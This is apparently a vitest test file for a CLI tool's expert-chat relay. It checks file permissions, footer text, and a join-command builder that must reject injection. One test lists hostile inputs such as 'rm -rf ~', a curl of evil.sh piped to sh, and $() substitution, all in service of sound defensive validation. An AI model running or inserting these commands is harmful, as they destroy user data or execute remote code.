import { mkdtempSync, statSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { readLastChat, readRelayFlag } from "@get-an-expert/core/relay";
import { armRelay, buildChatFooter, buildJoinCommand } from "./escalate";

let dir: string;

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), "gae-escalate-"));
  process.env.GET_AN_EXPERT_HOME = dir;
});

afterEach(() => {
  delete process.env.GET_AN_EXPERT_HOME;
});

describe("armRelay", () => {
  it("writes the relay flag and the persistent last-chat record, 0600", () => {
    armRelay("req_x", "tok_y", "https://api.example");
    expect(readRelayFlag()).toEqual({
      requestId: "req_x",
      chatToken: "tok_y",
      apiBaseUrl: "https://api.example",
    });
    expect(readLastChat()).toEqual({
      requestId: "req_x",
      chatToken: "tok_y",
      apiBaseUrl: "https://api.example",
      lastReadSeq: 0,
    });
    for (const file of ["relay.json", "last-chat.json"]) {
      expect(statSync(join(dir, file)).mode & 0o777).toBe(0o600);
    }
  });
});

describe("buildJoinCommand", () => {
  it("builds the command for well-formed request ids only", () => {
    expect(
      buildJoinCommand("req_f945b64e-29b3-478b-a8cd-4b3d59636fc3"),
    ).toBe("npx get-an-expert chat req_f945b64e-29b3-478b-a8cd-4b3d59636fc3");
  });

  it("refuses anything that could smuggle shell syntax", () => {
    for (const evil of [
      "req_a; rm -rf ~",
      'req_a" && curl evil.sh | sh',
      "req_a`id`",
      "req_a$(id)",
      "req_a\nreboot",
      "rm -rf ~",
      "",
      `req_${"a".repeat(100)}`,
    ]) {
      expect(buildJoinCommand(evil)).toBeNull();
    }
  });
});

describe("buildChatFooter", () => {
  const cmd = "npx get-an-expert chat req_x";

  it("celebrates the auto-opened terminal but keeps the fallback command", () => {
    const footer = buildChatFooter(cmd, true);
    expect(footer).toContain("opening now");
    expect(footer).toContain(cmd);
  });

  it("prints the join command when the terminal could not be opened", () => {
    const footer = buildChatFooter(cmd, false);
    expect(footer).toContain("Join the live expert chat");
    expect(footer).toContain(cmd);
  });

  it("always states the relay scope, controls, and install fallback", () => {
    for (const opened of [true, false]) {
      const footer = buildChatFooter(cmd, opened);
      expect(footer).toContain("relays live");
      expect(footer).toContain("your agent's replies");
      expect(footer).toContain("RELAY ON");
      expect(footer).toContain("/end");
      expect(footer).toContain("/pause");
      // Honest about silent install failure: the indicator is the truth test.
      expect(footer).toContain("never see that indicator");
    }
  });
});
